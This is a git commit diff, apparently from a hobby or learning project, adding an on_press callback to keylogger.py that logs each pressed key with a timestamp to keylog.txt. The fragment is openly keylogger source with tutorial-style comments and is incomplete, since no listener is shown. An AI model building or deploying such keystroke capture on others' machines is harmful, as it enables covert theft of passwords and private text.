0a93038272e12468dd9ee8e60aeb68f3b6aed4de
Rahul Singh <rahul@Rahuls-MacBook-Air.local>
2024-02-05 17:52:57 +0000

    Add key log function

--- keylogger.py
+++ keylogger.py
@@ -6,3 +6,8 @@ import logging  # Import the logging module
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 # Set up logging to a file named "keylog.txt", capturing messages of DEBUG level and higher,
 # with a specific format including timestamp and log message.
+
+# Define a function to be called when a key is pressed
+def on_press(key):
+    logging.info(str(key))
+    # Log information about the pressed key at the INFO level, converting the key to a string.
